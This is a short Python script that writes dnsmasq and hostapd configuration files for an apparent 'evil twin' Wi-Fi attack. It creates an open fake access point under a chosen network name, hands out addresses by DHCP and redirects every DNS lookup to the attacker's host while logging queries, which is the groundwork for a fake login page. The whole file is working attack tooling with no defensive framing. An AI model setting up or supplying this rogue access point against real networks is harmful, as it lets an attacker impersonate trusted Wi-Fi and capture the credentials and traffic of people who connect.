import sys

dnsmasq = '''interface={interface}mon
dhcp-range=192.168.1.2,192.168.1.250,255.255.255.0,12h
address=/#/192.168.1.1
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=192.168.1.1
log-queries
log-dhcp
listen-address=127.0.0.1'''

hostapd = '''interface={interface}mon
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0'''

def config_dnsmasq(interface="wlan0"):
    file='FakeAuth_EvilTwin/dnsmasq.conf' 
    with open(file, 'w') as f:
        f.write(dnsmasq.format(interface=interface))
        
def config_hostapd(interface="wlan0",ssid="Dlink_Test",channel="8"):
    file='FakeAuth_EvilTwin/hostapd.conf' 
    with open(file, 'w') as f:
        f.write(hostapd.format(interface=interface,ssid=ssid,channel=channel))
        
#interface = input("[+] Enter Interface : ")
#ssid = input("[+] Enter Fake AP's SSID : ")
#channel = input("[+] Enter Channel : ")
config_dnsmasq(sys.argv[1])
config_hostapd(sys.argv[1],sys.argv[2],sys.argv[3])
